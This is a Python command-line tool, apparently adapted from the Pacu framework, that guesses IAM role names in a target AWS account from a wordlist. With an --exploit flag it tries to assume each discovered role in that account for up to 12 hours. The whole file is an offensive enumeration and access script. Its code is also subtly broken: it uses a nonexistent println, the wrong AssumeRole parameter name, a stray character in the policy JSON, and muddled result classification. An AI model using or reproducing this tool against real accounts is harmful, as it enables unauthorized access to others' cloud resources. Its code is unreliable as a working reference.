import boto3
import click
import json
import random
import string
from tqdm import tqdm
from pprint import pprint
import logging
import traceback


@click.command()
@click.option("-v", "--verbose", "verbose", help="More output", is_flag=True)
@click.option(
    "-t", "--target", "target", help="Target account number", type=int, required=True
)
@click.option("-r", "--roles", "roles", help="Only check roles", is_flag=True)
@click.option("-u", "--user", "user", help="Only check users", is_flag=True)
@click.option(
    "-e",
    "--exploit",
    "exploit",
    help="Go beyond the preliminary check and attempt to assume into, report on results",
    is_flag=True,
)
def main(verbose, target, roles, user, exploit):
    """
    This CLI tool is a derivative of a module in the PACU framework by RhinoSecurity.
    As such it duplicates the enum_roles and enum_users functionality without dragging
    the whole framework and all the plugins along.
    """
    role_arn = f"arn:aws:iam::{target}:role/"
    wordlist = []
    positives_list = []
    possibles_list = []
    negatives_list = []

    with open("wordlist.txt", "r") as file:
        wordlist = [word.rstrip() for word in file.readlines()]

    pprint(wordlist)

    try:
        session = boto3.session.Session(profile_name="default")
    except Exception as e:
        logging.error(traceback.format_exc())
        print("Err'd out")
        exit(1)
    if roles:
        for word in tqdm(wordlist):
            client = session.client("iam")
            current_policy_arn_to_probe = f"""{{
                "Version": "2012-10-17",
                "Statement": [
                {{
                            "Effect": "Deny",
                            "Principal": {{
                                    "AWS": "{role_arn}{word}"
                            }},
                            "Action": "sts:AssumeRole"
                }}
                ]
            }})"""

            # test each role in the wordlist for this account
            try:
                response = client.update_assume_role_policy(
                    PolicyDocument=current_policy_arn_to_probe, RoleName=word
                )
                positives_list.append(
                    {
                        "word": word,
                        "arn": f"{role_arn}{word}",
                        "class": "Positive",
                        "error": False,
                    }
                )
            except Exception as e:
                if "MalformedPolicyDocument" in str(e):
                    negatives_list.append(
                        {
                            "word": word,
                            "arn": f"{role_arn}{word}",
                            "class": "MalformedPolicyDocument",
                            "error": json.dumps(e),
                        }
                    )
                elif "NoSuchEntity" in str(e):
                    possibles_list.append(
                        {
                            "word": word,
                            "arn": f"{role_arn}{word}",
                            "class": "NoSuchEntity",
                            "error": json.dumps(e),
                        }
                    )
                else:
                    negatives_list.append(
                        {
                            "word": word,
                            "arn": f"{role_arn}{word}",
                            "class": "UnhandledException",
                            "error": json.dumps(e),
                        }
                    )
    # Also see if you can assume role
    if exploit and len(positives_list) > 0:
        for positive in positives_list:
            try:
                response = client.assume_role(
                    RoleArn=f"{role_arn}{positive['word']}",
                    RoleSessionName="".join(
                        [
                            random.choice(string.ascii_letters + string.digits)
                            for n in range(32)
                        ]
                    ),
                    Duration=43200,
                )
                println("Successfully assumed role for 12 hours")
            except Exception as e:
                if "The requested DurationSeconds exceeds" in str(e):
                    try:
                        response = client.assume_role(
                            RoleArn=f"{role_arn}{positive['word']}",
                            RoleSessionName="".join(
                                [
                                    random.choice(string.ascii_letters + string.digits)
                                    for n in range(32)
                                ]
                            ),
                            Duration=3600,
                        )
                        println("Successfully assumed role for 1 hour")
                    except Exception as e:
                        logging.error(traceback.format_exc())
                else:
                    logging.error(traceback.format_exc())

    print("Positive role detections")
    pprint(positives_list)
    print("Possible role detections")
    pprint(possibles_list)


if __name__ == "__main__":
    main()
